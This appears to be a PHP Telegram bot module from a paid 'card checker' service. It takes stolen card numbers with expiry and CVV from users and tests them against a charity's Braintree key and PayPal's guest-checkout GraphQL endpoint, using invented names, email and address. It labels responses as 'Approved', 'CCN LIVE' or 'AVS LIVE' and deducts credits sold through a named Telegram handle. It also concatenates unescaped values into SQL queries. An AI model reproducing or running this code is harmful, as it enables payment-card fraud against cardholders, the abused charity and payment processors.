<?php
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//

//=====WHO CAN CHECK FUNC END======//
if (preg_match('/^(\/py|\.py|!py)/', $text)) {
    $userid = $update['message']['from']['id'];
        $SQL = "SELECT * FROM `users` WHERE `teleid`=".$userId;
    $CONSULTA = mysqli_query($con,$SQL);
    $f = mysqli_num_rows($CONSULTA);
if ($f > 0) 
     {} else{
        reply_tox($chatId,$message_id,$keyboard,"<code>You are not registered, Register first with</code> /register <code> to use me</code>");
        }
        $userid = $update['message']['from']['id'];
        $SQL = "SELECT * FROM `chats` WHERE `auchat`=".$chat_id;
    $CONSULTA = mysqli_query($con,$SQL);
    $f = mysqli_num_rows($CONSULTA);
    if ($f > 0) {} else{
         $dec = "NOT";
        } 
    
if($credit <1)
        {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> This chat not authorised or ❌ your account have insufficient funds cantect @badboychx to buy credits</b>");
        exit();
        }       
  
  
$start_time = microtime(true);

  $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";
  $lista = substr($message, 4);
  $messageidtoedit1 = bot('sendmessage',[
      'chat_id'=>$chat_id,
      'text'=>"<b>Wait for Result...⏳</b>",
      'parse_mode'=>'html',
      'reply_to_message_id'=> $message_id
  ]);
  $messageidtoedit = Getstr(json_encode($messageidtoedit1), '"message_id":', ',');

  $cc = multiexplode(array(":", "/", " ", "|"), $lista)[0];
  $mes = multiexplode(array(":", "/", " ", "|"), $lista)[1];
  $ano = multiexplode(array(":", "/", " ", "|"), $lista)[2];
  $cvv = multiexplode(array(":", "/", " ", "|"), $lista)[3];
  $amt = '1';
  if(empty($cc)||empty($cvv)||empty($mes)||empty($ano)){
      bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"Wrong Format!\n ⚠️• 𝘚𝘦𝘯𝘥 <code>/chk cc|mm|yy|cvv</code>• 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 <code>paypal Charge 1 USD</code>",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              ]);
      return;
    };
  if(strlen($ano) == '4'){
      $an = substr($ano, 2);
  }
  else{
    $an = $ano;
  }
  bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"20%",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              ]);
 
  //------------Card info------------//
  



//////

$email = 'legendhr'.rand(11,9999).'@gmail.com';

////////////////////////////===[1ST CURL]
$url = 'https://api.braintreegateway.com/merchants/tfrvys82vyvb73qn/client_api/v1/paypal_hermes/create_payment_resource';

// Payload data
$header = array(
   'authority: api.braintreegateway.com',
    'accept: */*',
    'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type: application/json',
    'origin: https://constellationfund.org',
    'referer: https://constellationfund.org/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: cross-site',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
);
//&card[cvc]=000
$email = 'legendhr'.rand(11,9999).'@gmail.com';
$data = '{"returnUrl":"https://www.paypal.com/checkoutnow/error","cancelUrl":"https://www.paypal.com/checkoutnow/error","offerPaypalCredit":false,"experienceProfile":{"brandName":"The Constellation Fund","noShipping":"true","addressOverride":false},"amount":"5.00","currencyIsoCode":"USD","braintreeLibraryVersion":"braintree/web/3.46.0","_meta":{"merchantAppId":"constellationfund.org","platform":"web","sdkVersion":"3.46.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"275fd1da-bd08-4759-a9ba-d8d187cb3688"},"tokenizationKey":"production_cs4qzxs6_tfrvys82vyvb73qn"}';
// Initialize cURL session
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute cURL request
$r2 = curl_exec($ch);
$data = json_decode($r2,1);
$token = $data['paymentResource']['paymentToken'];
//echo$token = trim(strip_tags(getStr($r2, 'redirectUrl":"https://www.paypal.com/checkoutnow?token=', '",'))); 


curl_close($ch);
$url = 'https://www.paypal.com/graphql?OnboardGuestMutation';

// Payload data
$header = array(
    'authority: www.paypal.com',
    'accept: */*',
    'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type: application/json',
    'origin: https://www.paypal.com',
    'paypal-client-context: EC-'.$token.'',
    'paypal-client-metadata-id: EC-'.$token.'',
    'referer: https://www.paypal.com/checkoutweb/signup?token=EC-'.$token.'&locale.x=en_GB&fundingSource=paypal&sessionID=uid_8ee4d7ced6_mdu6mjq6mda&buttonSessionID=uid_1d6dca78f2_mdu6mjq6mte&env=production&fundingOffered=paypal&logLevel=warn&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWxvYmplY3RzLmNvbS9hcGkvY2hlY2tvdXQuanMifQ&uid=2b3287132f&version=4&xcomponent=1&ssrt=1712381062703&rcache=1&useraction=CONTINUE&country.x=IN&locale.x=en_IN&country.x=IN',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-arch: ""',
    'sec-ch-ua-bitness: ""',
    'sec-ch-ua-full-version: "124.0.6327.2"',
    'sec-ch-ua-full-version-list: "Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-model: "220333QBI"',
    'sec-ch-ua-platform: "Android"',
    'sec-ch-ua-platform-version: "13.0.0"',
    'sec-ch-ua-wow64: ?0',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-app-name: checkoutuinodeweb_weasley',
    'x-country: US',
    'x-locale: en_US',
    'x-requested-with: fetch',
);
//&card[cvc]=000
$data = '{"operationName":"OnboardGuestMutation","variables":{"card":{"cardNumber":"'.$cc.'","expirationDate":"'.$mes.'/'.$ano.'","securityCode":"'.$cvv.'","type":"VISA"},"country":"US","email":"legendhr75@gmail.com","firstName":"Badboychkk","lastName":"Chkumar","phone":{"countryCode":"1","number":"3049728498","type":"MOBILE"},"supportedThreeDsExperiences":["IFRAME"],"token":"EC-'.$token.'","billingAddress":{"line1":"836 West Street Road","city":"Warminster","state":"PA","postalCode":"18974","accountQuality":{"autoCompleteType":"GOOGLE","isUserModified":false,"twoFactorPhoneVerificationId":""},"country":"US","familyName":"Chkumar","givenName":"Badboychkk"},"shippingAddress":{"line1":"","city":"","state":"","postalCode":"","accountQuality":{"autoCompleteType":"MANUAL","isUserModified":false},"country":"US","familyName":"Chkumar","givenName":"Badboychkk"},"crsData":null},"query":"mutation OnboardGuestMutation($bank: BankAccountInput, $billingAddress: AddressInput, $card: CardInput, $country: CountryCodes, $currencyConversionType: CheckoutCurrencyConversionType, $dateOfBirth: DateOfBirth, $email: String, $firstName: String\u0021, $lastName: String\u0021, $phone: PhoneInput, $shareAddressWithDonatee: Boolean, $shippingAddress: AddressInput, $supportedThreeDsExperiences: [ThreeDSPaymentExperience], $token: String\u0021) {\\n  onboardAccount: onboardGuest(\\n    bank: $bank\\n    billingAddress: $billingAddress\\n    card: $card\\n    country: $country\\n    currencyConversionType: $currencyConversionType\\n    dateOfBirth: $dateOfBirth\\n    email: $email\\n    firstName: $firstName\\n    lastName: $lastName\\n    phone: $phone\\n    shareAddressWithDonatee: $shareAddressWithDonatee\\n    shippingAddress: $shippingAddress\\n    token: $token\\n  ) {\\n    buyer {\\n      auth {\\n        accessToken\\n        __typename\\n      }\\n      userId\\n      __typename\\n    }\\n    flags {\\n      is3DSecureRequired\\n      __typename\\n    }\\n    ...fundingOptions\\n    paymentContingencies {\\n      threeDomainSecure(experiences: $supportedThreeDsExperiences) {\\n        status\\n        redirectUrl {\\n          href\\n          __typename\\n        }\\n        method\\n        parameter\\n        experience\\n        requestParams {\\n          key\\n          value\\n          __typename\\n        }\\n        __typename\\n      }\\n      ...threeDSContingencyData\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\\nfragment fundingOptions on CheckoutSession {\\n  fundingOptions {\\n    allPlans {\\n      fundingSources {\\n        fundingInstrument {\\n          id\\n          __typename\\n        }\\n        amount {\\n          currencyCode\\n          currencyValue\\n          __typename\\n        }\\n        __typename\\n      }\\n      __typename\\n    }\\n    fundingInstrument {\\n      id\\n      lastDigits\\n      name\\n      nameDescription\\n      type\\n      __typename\\n    }\\n    __typename\\n  }\\n  __typename\\n}\\n\\nfragment threeDSContingencyData on PaymentContingencies {\\n  threeDSContingencyData {\\n    name\\n    causeName\\n    resolution {\\n      type\\n      resolutionName\\n      paymentCard {\\n        billingAddress {\\n          line1\\n          line2\\n          city\\n          state\\n          country\\n          postalCode\\n          __typename\\n        }\\n        expireYear\\n        expireMonth\\n        currencyCode\\n        cardProductClass\\n        id\\n        encryptedNumber\\n        type\\n        number\\n        bankIdentificationNumber\\n        __typename\\n      }\\n      contingencyContext {\\n        deviceDataCollectionUrl {\\n          href\\n          __typename\\n        }\\n        jwtSpecification {\\n          jwtDuration\\n          jwtIssuer\\n          jwtOrgUnitId\\n          type\\n          __typename\\n        }\\n        reason\\n        referenceId\\n        source\\n        __typename\\n      }\\n      __typename\\n    }\\n    __typename\\n  }\\n  __typename\\n}\\n"}';
// Initialize cURL session
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute cURL request
$r3 = curl_exec($ch);
$msg1 = trim(strip_tags(getStr($r3, '"message":"', '",'))); 
curl_close($ch);


$end_time = microtime(true);
  $time = number_format($end_time - $start_time, 2);



    if (
        strpos($r3, 'ADD_SHIPPING_ERROR') ||
        strpos($r3, 'NEED_CREDIT_CARD') ||
        strpos($r3, '"status": "succeeded"') ||
        strpos($r3, 'Thank You For Donation.') ||
        strpos($r3, 'Your payment has already been processed') ||
        strpos($r3, 'Success ') ||
        strpos($r3, '"type":"one-time"') ||
        strpos($r3, '/donations/thank_you?donation_number=')
    ) {
        $es = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅";
        $msg = "CHARGED 1$ SUCCESSFULLY 🟢";
        $code = "CHARGED 0.01$ SUCCESSFULLY 🟢";
    } elseif (strpos($r3, 'INVALID_BILLING_ADDRESS')) {
        $es = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅";
        $msg = "INVALID BILLING ADDRESS";
        $code = "AVS LIVE 🟢";
    } elseif (strpos($r3, 'INVALID_SECURITY_CODE')) {
        $es = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅";
        $msg = "INVALID SECURITY CODE";
        $code = "CCN LIVE  🟢";
    } elseif (strpos($r3, 'EXISTING_ACCOUNT_RESTRICTED')) {
        $es = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅";
        $msg = "Existing Account Restricted ";
        $code = "-";
    } elseif (strpos($r3, 'is3DSecureRequired')) {
        $es = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅";
        $msg = "3D SECURE REQUIRED 🟡";
        $code = ".";
    } elseif (strpos($r3, 'CARD_GENERIC_ERROR')) {
        $es = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌";
        $msg = "ISSUER_DECLINE";
        $code = "CARD_GENERIC_ERROR";
    } else {
        $es = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌";
        $msg = $msg1;
    }


  decreaseCredit($userId);

    bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"100%",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              ]);

          bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"<b>-----------『↯REX↯』-----------</b>
↳ Gateway Braintree+PayPal 1$ [🍃]
-----------------------------------------
⎆𝐂𝐂» <code>$lista</code>
⎆𝐒𝐭𝐚𝐭𝐮𝐬» [ <code>$es</code> ]
⎆𝐌𝐞𝐬𝐬𝐚𝐠𝐞» <code>$msg</code>
------------------------------------------
⎆𝙿𝚛𝚘𝚡𝚢» Live ✅
⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» <code><i>$time Seconds</i></code>
⎆𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲» @$username <code><b>[$role]</b></code>
⎆BOT 𝐛𝐲» @badboychx",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              ]);
  }
  ?>
